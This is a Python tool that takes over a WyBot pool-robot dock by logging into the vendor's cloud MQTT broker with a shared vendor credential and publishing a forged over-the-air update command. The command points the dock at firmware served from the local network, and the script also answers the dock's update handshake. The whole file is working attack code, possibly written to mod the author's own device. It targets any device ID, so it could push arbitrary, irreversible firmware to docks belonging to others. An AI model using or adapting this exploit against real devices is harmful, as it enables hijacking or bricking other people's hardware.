#!/usr/bin/env python3
"""
Trigger the WyBot dock to OTA-flash a LOCAL firmware image (the stage-1 takeover).

It (1) serves firmware.ota.bin over HTTP on the LAN, (2) publishes a forged
`recv_start_update` pointing the dock at that URL + md5, (3) answers the
`notify_ready_to_update` handshake, and (4) prints progress / errcode.

!!! IRREVERSIBLE: this flashes the real dock. The stock bootloader has NO rollback, so the
image you serve MUST be known-good (pre-validated on a spare C3). Do not run this until you
have (a) pre-validated the exact firmware.ota.bin, and (b) confirmed the message envelope with
ota_capture.py. See docs/ota-flashing.md.

Credentials via env (shared vendor MQTT credential; not shipped):
    export WYBOT_MQTT_HOST=mqtt.wybotpool.com WYBOT_MQTT_USER=... WYBOT_MQTT_PASS=...

    python3 ota_push.py --device <dockId> --bin /path/firmware.ota.bin \
        --host-ip 192.168.x.y [--port 8099] [--board iot] \
        [--envelope entry|firmware-array|cmd] [--dry-run]
"""
import argparse, asyncio, hashlib, http.server, json, os, socketserver, sys, threading, time

def md5_of(path):
    h = hashlib.md5()
    with open(path, "rb") as f:
        for b in iter(lambda: f.read(65536), b""):
            h.update(b)
    return h.hexdigest()

def serve_dir(directory, port):
    handler = lambda *a, **k: http.server.SimpleHTTPRequestHandler(*a, directory=directory, **k)
    httpd = socketserver.TCPServer(("0.0.0.0", port), handler)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    return httpd

def build_entry(args, url, md5):
    return {
        "id": 1, "boardID": args.board, "productModel": args.product,
        "chipType": "", "softwareVer": args.softver, "hardwareVer": args.hwver,
        "url": url, "md5": md5, "target": "0.0.0", "dependency": "",
        "enforce": False, "manual": 1,
    }

def wrap(entry, envelope):
    if envelope == "entry":          # bare firmware object
        return entry
    if envelope == "firmware-array": # {"firmware":[entry]}
        return {"firmware": [entry]}
    if envelope == "cmd":            # {"ts":..,"cmd":..,"firmware":[entry]}
        return {"ts": int(time.time()), "cmd": 4, "firmware": [entry]}
    raise SystemExit(f"unknown envelope {envelope}")

async def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--device", required=True)
    ap.add_argument("--bin", required=True)
    ap.add_argument("--host-ip", required=True, help="this machine's LAN IP the dock can reach")
    ap.add_argument("--port", type=int, default=8099)
    ap.add_argument("--board", default="iot")
    ap.add_argument("--product", default="DS20")
    ap.add_argument("--softver", default="2.2.20")
    ap.add_argument("--hwver", default="5.127.0")
    ap.add_argument("--envelope", default="firmware-array", choices=["entry", "firmware-array", "cmd"])
    ap.add_argument("--minutes", type=float, default=10)
    ap.add_argument("--dry-run", action="store_true", help="print the message + serve, but DON'T publish")
    args = ap.parse_args()

    if not os.path.isfile(args.bin):
        sys.exit(f"no such file: {args.bin}")
    md5 = md5_of(args.bin)
    fname = os.path.basename(args.bin)
    url = f"http://{args.host_ip}:{args.port}/{fname}"
    entry = build_entry(args, url, md5)
    payload = wrap(entry, args.envelope)
    topic = f"/device/OTA/recv_start_update/{args.device}"

    print(f"image   : {args.bin}  ({os.path.getsize(args.bin)} bytes)")
    print(f"md5     : {md5}")
    print(f"url     : {url}")
    print(f"topic   : {topic}")
    print(f"payload : {json.dumps(payload)}")

    httpd = serve_dir(os.path.dirname(os.path.abspath(args.bin)), args.port)
    print(f"serving {fname} on 0.0.0.0:{args.port}")

    if args.dry_run:
        print("\n--dry-run: not publishing. The file is being served; Ctrl-C to stop.")
        try:
            await asyncio.sleep(args.minutes * 60)
        finally:
            httpd.shutdown()
        return

    host = os.environ.get("WYBOT_MQTT_HOST", "mqtt.wybotpool.com")
    user, pw = os.environ.get("WYBOT_MQTT_USER"), os.environ.get("WYBOT_MQTT_PASS")
    if not (user and pw):
        sys.exit("Set WYBOT_MQTT_USER / WYBOT_MQTT_PASS (shared vendor credential; not shipped).")
    import aiomqtt

    dev = args.device
    async with aiomqtt.Client(hostname=host, username=user, password=pw,
                              identifier=f"ota-push-{int(time.time())}") as c:
        # watch the handshake + progress
        for t in [f"/device/OTA/notify_ready_to_update/{dev}",
                  f"/device/OTA/post_update_progress/{dev}",
                  f"/device/OTA/post_errcode/{dev}"]:
            await c.subscribe(t)
        print(f"\npublishing recv_start_update ...")
        await c.publish(topic, json.dumps(payload))

        async def pump():
            async for m in c.messages:
                print(f"<< {m.topic}: {m.payload.decode(errors='replace')}", flush=True)
                # answer the readiness handshake if the device asks
                if m.topic.matches(f"/device/OTA/notify_ready_to_update/{dev}"):
                    reply = f"/device/OTA/notify_ready_to_update_reply/{dev}"
                    await c.publish(reply, json.dumps({"ts": int(time.time()), "ready": 1}))
                    print(f">> {reply}: ready", flush=True)
        try:
            await asyncio.wait_for(pump(), timeout=args.minutes * 60)
        except asyncio.TimeoutError:
            pass
    httpd.shutdown()
    print("done")

if __name__ == "__main__":
    asyncio.run(main())
